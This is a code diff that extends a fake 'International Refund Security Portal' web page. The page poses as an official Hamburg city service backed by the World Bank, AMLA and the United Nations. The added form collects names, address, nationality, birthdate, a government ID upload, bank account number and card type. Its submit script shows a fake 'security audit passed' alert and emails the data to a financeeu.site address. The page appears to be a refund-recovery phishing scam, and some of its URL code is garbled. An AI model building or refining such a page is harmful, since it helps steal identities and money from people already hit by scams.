@@ -6,6 +6,7 @@
     <title>International Refund Security Portal</title>
     <style>
         :root { --hamburg-red: #E10019; --hamburg-blue: #003063; --security-gold: #FFD700; }
+        
         body { 
             font-family: 'Segoe UI', Arial, sans-serif; margin: 0; padding: 20px; min-height: 100vh; 
             display: flex; justify-content: center; align-items: flex-start;
@@ -15,111 +16,169 @@
             linear-gradient(60deg, #00254d 25%, transparent 25.5%, transparent 75%, #00254d 75%, #00254d);
             background-size: 80px 140px; overflow-x: hidden;
         }
-        .page-wrapper { display: flex; align-items: flex-start; justify-content: center; width: 100%; max-width: 1800px; gap: 50px; padding-top: 50px; }
+
+        .page-wrapper { display: flex; align-items: flex-start; justify-content: center; width: 100%; max-width: 1850px; gap: 50px; padding-top: 50px; }
+
+        /* MISSION & VISION OUTSIDE FORM */
         .side-text { width: 380px; color: white; line-height: 1.6; margin-top: 150px; }
         .side-text h3 { color: var(--security-gold); text-transform: uppercase; font-size: 28px; margin-bottom: 20px; border-bottom: 3px solid var(--security-gold); display: inline-block; padding-bottom: 5px; font-weight: 900; }
         .side-text p { font-size: 18px; font-weight: 500; text-align: justify; text-shadow: 2px 2px 4px rgba(0,0,0,0.8); }
+
         .form-container { background: #ffffff; width: 100%; max-width: 900px; border-radius: 4px; box-shadow: 0 50px 150px rgba(0,0,0,0.9); overflow: hidden; border-top: 15px solid var(--hamburg-red); position: relative; z-index: 10; }
         .security-banner { background: var(--hamburg-blue); color: white; padding: 14px; text-align: center; font-size: 12px; font-weight: bold; text-transform: uppercase; border-bottom: 3px solid var(--security-gold); letter-spacing: 2px; }
+        
         .header { padding: 45px 40px; text-align: center; background: #fff; border-bottom: 8px solid var(--hamburg-blue); }
         .header h1 { color: var(--hamburg-blue); margin: 0; font-size: 32px; font-weight: 900; text-transform: uppercase; border: 2px solid var(--hamburg-blue); display: inline-block; padding: 10px 20px; }
         .header .declaration { margin: 20px auto 0; color: #333; font-weight: 800; font-size: 13px; text-transform: uppercase; letter-spacing: 0.5px; max-width: 750px; line-height: 1.5; }
+        
         .section-box { padding: 50px; display: none; }
         .section-box.active { display: block; }
-        h2 { font-size: 20px; color: var(--hamburg-blue); margin-bottom: 10px; font-weight: 800; text-transform: uppercase; }
+        
+        h2 { font-size: 20px; color: var(--hamburg-blue); margin-bottom: 15px; font-weight: 800; text-transform: uppercase; border-bottom: 2px solid #eee; padding-bottom: 10px; }
         .grid-3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 20px; }
         .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 25px; }
-        label { display: block; font-weight: 800; margin-bottom: 10px; font-size: 12px; color: var(--hamburg-blue); text-transform: uppercase; }
+        
+        label { display: block; font-weight: 800; margin-bottom: 10px; font-size: 11px; color: var(--hamburg-blue); text-transform: uppercase; }
         input { width: 100%; padding: 16px; border: 1px solid #bbb; box-sizing: border-box; font-size: 15px; border-radius: 2px; }
         input.invalid { border: 2px solid var(--hamburg-red); background-color: #fffafa; }
-        .review-item { margin-bottom: 15px; padding: 10px; border-bottom: 1px solid #f0f0f0; }
+
+        .review-item { margin-bottom: 12px; padding: 10px; border-bottom: 1px solid #f0f0f0; }
         .review-label { font-size: 10px; font-weight: 800; color: var(--hamburg-blue); text-transform: uppercase; }
         .review-value { font-size: 16px; color: #333; margin-top: 5px; font-weight: 600; }
-        .contact-link { display: block; text-align: center; margin-top: 20px; font-weight: 900; color: #ffffff; background-color: var(--hamburg-red); text-decoration: none; font-size: 16px; text-transform: uppercase; border-radius: 4px; padding: 20px; cursor: pointer; transition: 0.3s; }
-        .contact-link:hover { background-color: var(--hamburg-blue); }
+
+        .contact-link { display: block; text-align: center; margin-top: 20px; font-weight: 900; color: #ffffff; background-color: var(--hamburg-red); text-decoration: none; font-size: 16px; text-transform: uppercase; border-radius: 4px; padding: 20px; transition: 0.3s; cursor: pointer; }
+        
         .btn-container { display: flex; justify-content: flex-end; margin-top: 40px; gap: 15px; }
         button { background-color: var(--hamburg-blue); color: white; border: none; padding: 20px 60px; cursor: pointer; font-size: 15px; font-weight: 900; text-transform: uppercase; }
         .btn-back { background-color: #888; }
-        .establishment-footer { text-align: center; padding: 30px; font-size: 13px; color: #888; background: #fdfdfd; border-top: 1px solid #eee; text-transform: uppercase; line-height: 1.6; }
+
+        .establishment-footer { text-align: center; padding: 30px; font-size: 13px; font-weight: normal; color: #888; background: #fdfdfd; border-top: 1px solid #eee; text-transform: uppercase; line-height: 1.6; }
     </style>
 </head>
 <body>
+
     <div class="page-wrapper">
         <div class="side-text">
             <h3>MISSION</h3>
-            <p>To provide an impenetrable layer of security for every financial transaction by utilizing advanced, multi-stage verification protocols and proactive fraud detection systems that strictly safeguard our users' assets against digital scams.</p>
+            <p>To provide an impenetrable layer of security for every financial transaction by utilizing advanced, multi-stage verification protocols and proactive fraud detection systems that strictly safeguard our users' assets against evolving digital scams and unauthorized access during the refund process.</p>
         </div>
+
         <div class="form-container">
             <div class="security-banner">🛡️ SECURE RETURNS, SCAM FREE SERVICE</div>
             <div class="header">
                 <h1>FREIE UND HANSESTADT HAMBURG</h1>
-                <div class="declaration">GLOBAL THEME & SECURITY DECLARATION: DEDICATED TO ERADICATING FRAUD THROUGH VIGILANT VERIFICATION...</div>
+                <div class="declaration">GLOBAL THEME & SECURITY DECLARATION: DEDICATED TO ERADICATING FRAUD THROUGH VIGILANT VERIFICATION, ETHICAL FINANCIAL STEWARDSHIP, AND THE UNCOMPROMISING PROTECTION OF EVERY LEGITIMATE CLAIM</div>
             </div>
+
             <form id="masterForm">
+                <!-- SECTION 1 -->
                 <div id="section1" class="section-box active">
-                    <h2>SECTION 1: IDENTITY</h2>
+                    <h2>SECTION 1: IDENTITY & NATIONALITY</h2>
                     <div class="grid-3">
                         <div><label>Last Name *</label><input type="text" id="ln" class="req"></div>
                         <div><label>First Name *</label><input type="text" id="fn" class="req"></div>
                         <div><label>Middle Name *</label><input type="text" id="mn" class="req"></div>
                     </div>
-                    <div style="margin-top:20px;"><label>Birthdate *</label><input type="text" id="bd" class="req" placeholder="MM / DD / YYYY"></div>
-                    <div style="margin-top:20px;"><label>Upload Valid ID *</label><input type="file" id="idU" class="req"></div>
+                    <div style="margin-top:25px;"><label>Residential Address *</label><input type="text" id="addr" class="req" placeholder="Enter Full Address"></div>
+                    <div class="grid-2" style="margin-top:25px;">
+                        <div><label>Nationality *</label><input type="text" id="nat" class="req"></div>
+                        <div><label>Birthdate *</label><input type="text" id="bd" class="req" placeholder="MM / DD / YYYY"></div>
+                    </div>
+                    <div class="grid-2" style="margin-top:25px;">
+                        <div><label>Email Address *</label><input type="email" id="em" class="req"></div>
+                        <div><label>Contact Number *</label><input type="text" id="ph" class="req"></div>
+                    </div>
+                    <div style="margin-top:25px;"><label>Upload Valid Government ID *</label><input type="file" id="idU" class="req"></div>
                     <div class="btn-container"><button type="button" onclick="validate(1, 2)">NEXT STEP</button></div>
                 </div>
+
+                <!-- SECTION 2 -->
                 <div id="section2" class="section-box">
-                    <h2>SECTION 2: REFUND</h2>
-                    <div><label>AMOUNT *</label><input type="text" id="amt" class="req"></div>
-                    <div style="margin-top:20px;"><label>Upload Receipt *</label><input type="file" id="rcpU" class="req"></div>
-                    <div style="margin-top:20px;"><label>Bank Name *</label><input type="text" id="bn" class="req"></div>
+                    <h2>SECTION 2: REFUND VERIFICATION</h2>
+                    <div><label>TOTAL REFUND AMOUNT *</label><input type="text" id="amt" class="req" placeholder="€ 0.00"></div>
+                    <div style="margin-top:25px;"><label>UPLOAD RECEIPT *</label><input type="file" id="rcpU" class="req"></div>
+                    <h2 style="margin-top:35px;">DISBURSEMENT INFORMATION</h2>
+                    <div><label>Bank Name / App *</label><input type="text" id="bnk" class="req"></div>
+                    <div class="grid-2" style="margin-top:25px;">
+                        <div><label>ACCOUNT NUMBER *</label><input type="text" id="an" class="req"></div>
+                        <div><label>TYPE OF CARD *</label><input type="text" id="ct" class="req"></div>
+                    </div>
                     <div class="btn-container">
                         <button type="button" class="btn-back" onclick="show(1)">BACK</button>
                         <button type="button" onclick="validate(2, 3)">REVIEW CLAIM</button>
                     </div>
                 </div>
+
+                <!-- SECTION 3 -->
                 <div id="section3" class="section-box">
-                    <h2>SECTION 3: REVIEW</h2>
+                    <h2>SECTION 3: REVIEW INFORMATION</h2>
                     <div id="reviewDisplay"></div>
                     <div class="contact-link" onclick="openGmail()">📧 DIRECT CONTACT THE AUTHORITY</div>
                     <div class="btn-container">
-                        <button type="button" class="btn-back" onclick="show(2)">EDIT</button>
-                        <button type="button" onclick="finalAction()">SUBMIT TO AUTHORITY</button>
+                        <button type="button" class="btn-back" onclick="show(2)">EDIT INFO</button>
+                        <button type="button" onclick="finalSubmit()">SUBMIT TO AUTHORITY</button>
                     </div>
                 </div>
             </form>
-            <div class="establishment-footer">ESTABLISHED BY: WORLD BANK GROUP • AMLA • UNITED NATIONS</div>
+
+            <div class="establishment-footer">ESTABLISHED BY: WORLD BANK GROUP • AMLA • UNITED NATIONS<br>AUTHORIZED OPERATIONAL DATE: APRIL 20, 2025</div>
         </div>
+
         <div class="side-text">
             <h3>VISION</h3>
-            <p>To be recognized as the premier global benchmark for commercial integrity and consumer safety.</p>
+            <p>To be recognized as the premier global benchmark for commercial integrity and consumer safety, where a culture of absolute transparency and sophisticated security ensures that every individual can navigate the refund ecosystem with unwavering confidence and total protection from deceptive practices.</p>
         </div>
     </div>
+
     <script>
-        function show(p) { document.querySelectorAll('.section-box').forEach(b => b.classList.remove('active')); document.getElementById('section' + p).classList.add('active'); window.scrollTo(0,0); }
+        function show(p) {
+            document.querySelectorAll('.section-box').forEach(b => b.classList.remove('active'));
+            document.getElementById('section' + p).classList.add('active');
+            window.scrollTo(0,0);
+        }
+
         function validate(curr, next) {
             const inputs = document.getElementById('section' + curr).querySelectorAll('.req');
-            let ok = true; inputs.forEach(i => { if(!i.value) { i.classList.add('invalid'); ok = false; } else i.classList.remove('invalid'); });
-            if(ok) { if(next === 3) populate(); show(next); }
+            let ok = true;
+            inputs.forEach(i => { if(!i.value) { i.classList.add('invalid'); ok = false; } else i.classList.remove('invalid'); });
+            if(ok) { if(next === 3) populateReview(); show(next); }
         }
-        function populate() {
-            document.getElementById('reviewDisplay').innerHTML = `
-                <div class="review-item"><div class="review-label">NAME</div><div class="review-value">${document.getElementById('fn').value} ${document.getElementById('ln').value}</div></div>
-                <div class="review-item"><div class="review-label">AMOUNT</div><div class="review-value">${document.getElementById('amt').value}</div></div>
-                <div class="review-item"><div class="review-label">BANK</div><div class="review-value">${document.getElementById('bn').value}</div></div>
-            `;
+
+        function populateReview() {
+            const items = [
+                {l: "FULL NAME", v: document.getElementById('fn').value + " " + document.getElementById('mn').value + " " + document.getElementById('ln').value},
+                {l: "ADDRESS", v: document.getElementById('addr').value},
+                {l: "EMAIL", v: document.getElementById('em').value},
+                {l: "REFUND AMOUNT", v: document.getElementById('amt').value},
+                {l: "BANK", v: document.getElementById('bnk').value},
+                {l: "ACCOUNT", v: document.getElementById('an').value},
+                {l: "CARD TYPE", v: document.getElementById('ct').value}
+            ];
+            let html = "";
+            items.forEach(d => { html += `<div class="review-item"><div class="review-label">${d.l}</div><div class="review-value">${d.v}</div></div>`; });
+            document.getElementById('reviewDisplay').innerHTML = html;
         }
+
         function openGmail() {
             window.open('https://google.com', '_blank');
         }
-        function finalAction() {
+
+        function finalSubmit() {
             const ref = "REF-" + Math.floor(Math.random() * 1000000);
             const mailTo = "globalreimbursementmanagement@financeeu.site";
-            const subject = encodeURIComponent("OFFICIAL CLAIM - " + ref);
-            const body = encodeURIComponent("Name: " + document.getElementById('fn').value + " " + document.getElementById('ln').value + "\nRef: " + ref + "\nAmount: " + document.getElementById('amt').value);
+            const subject = encodeURIComponent("OFFICIAL CLAIM SUBMISSION - " + ref);
+            const body = encodeURIComponent(`Good day Authority,\n\nI am submitting my claim for processing.\n\nNAME: ${document.getElementById('fn').value} ${document.getElementById('ln').value}\nREF: ${ref}\nAMOUNT: ${document.getElementById('amt').value}\nADDRESS: ${document.getElementById('addr').value}\nBANK: ${document.getElementById('bnk').value}\n\nDocuments are attached for your review.`);
             
-            alert("SECURITY AUDIT PASSED. OPENING SECURE EMAIL CHANNEL...");
+            alert("SECURITY AUDIT PASSED. OPENING GMAIL DRAFT...");
             window.open(`https://google.com{mailTo}&su=${subject}&body=${body}`, '_blank');
-            document.getElementById('section3').innerHTML = `<div style="text-align:center; padding:40px;"><h2>SUBMISSION RECORDED</h2><p>Reference: ${ref}</p><div style="font-size:60px;">✅</div></div>`;
+            
+            document.getElementById('section3').innerHTML = `
+                <div style="text-align:center; padding:40px;">
+                    <h2 style="color: var(--hamburg-blue);">SUBMISSION SUCCESSFUL</h2>
+                    <p>Reference Number: <strong>${ref}</strong></p>
+                    <div style="font-size:60px; margin:20px;">✅</div>
+                    <button type="button" onclick="location.reload()" style="background:var(--hamburg-blue); color:white; padding:15px 30px; border:none; cursor:pointer; font-weight:bold;">DONE</button>
+                </div>`;
         }
     </script>
 </body>
